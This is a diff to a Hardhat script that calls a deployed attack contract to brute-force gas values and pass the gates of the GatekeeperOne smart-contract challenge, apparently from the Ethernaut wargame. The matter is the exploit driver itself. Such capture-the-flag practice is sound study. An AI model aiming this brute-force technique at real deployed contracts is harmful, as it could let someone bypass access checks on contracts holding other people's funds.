@@ -6,20 +6,21 @@ async function main() {
     GatekeeperOneAttack_v2 contract must be pre-deployed
     */
 
-    const attackAddress = "0x2624Cc49e6A0Ee5Db27E72e7bcAC9c5929682FbE"
+    const attackAddress = "0xdB89C939EcAaf92284A9B1FcD938A6Cc0CFf51e1"
 
     const { deployer } = await ethers.getNamedSigners()
     const initialBalance = await ethers.provider.getBalance(deployer.address)
     const attack = await ethers.getContractAt("GatekeeperOneAttackV2", attackAddress)
 
     // test gas limits 200 at a time
-    for (let i = 0; i < 41; i++) {
+    for (let i = 0; i < 2; i++) {
         const a = i * 200
         const b = a + 200
         const tx = await attack.enterBruteForce(a, b)
         const txReceipt = await tx.wait()
         const result = txReceipt.events[0].event
-        if (result == Success) {
+        console.log(`${a}-${b}: ${result.toString()}`)
+        if (result.toString() == "Success") {
             // we have successfully become entrant
             break
         }
